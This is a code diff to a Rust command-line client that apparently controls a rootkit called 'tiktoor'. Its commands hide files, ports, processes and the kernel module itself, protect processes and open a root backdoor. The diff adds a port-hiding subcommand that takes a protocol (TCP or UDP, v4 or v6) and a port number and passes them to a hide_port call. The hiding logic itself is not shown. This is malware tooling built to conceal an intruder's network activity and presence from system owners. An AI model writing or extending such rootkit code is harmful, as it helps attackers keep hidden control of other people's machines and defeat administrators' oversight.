@@ -13,7 +13,12 @@ enum Cli {
     /// Hide file
     FileHiding,
     /// Hide port
-    PortHiding,
+    PortHiding {
+        #[structopt(subcommand)]
+        transmission_type: PortHidingTransmissionType,
+        #[structopt(short, long)]
+        port: u16,
+    },
     /// Hide process
     ProcessHiding {
         /// Process pid
@@ -34,6 +39,20 @@ enum Cli {
     BackdoorForRoot,
 }
 
+/// Port hiding transmission type
+#[repr(u8)]
+#[derive(StructOpt)]
+enum PortHidingTransmissionType {
+    /// TCP4
+    Tcp4 = 0x0,
+    /// TCP6
+    Tcp6 = 0x1,
+    /// UDP4
+    Udp4 = 0x2,
+    /// UDP6
+    Udp6 = 0x3,
+}
+
 fn main() {
     let cli = Cli::from_args();
 
@@ -44,7 +63,10 @@ fn main() {
             }
         }
         Cli::FileHiding => {}
-        Cli::PortHiding => {}
+        Cli::PortHiding {
+            transmission_type,
+            port,
+        } => tiktoor_client::hide_port(transmission_type as u8, port),
         Cli::ProcessHiding { pid } => tiktoor_client::hide_process(pid),
         Cli::ProcessProtection { pid } => tiktoor_client::protect_process(pid),
         Cli::ModuleHiding => tiktoor_client::hide_module(),
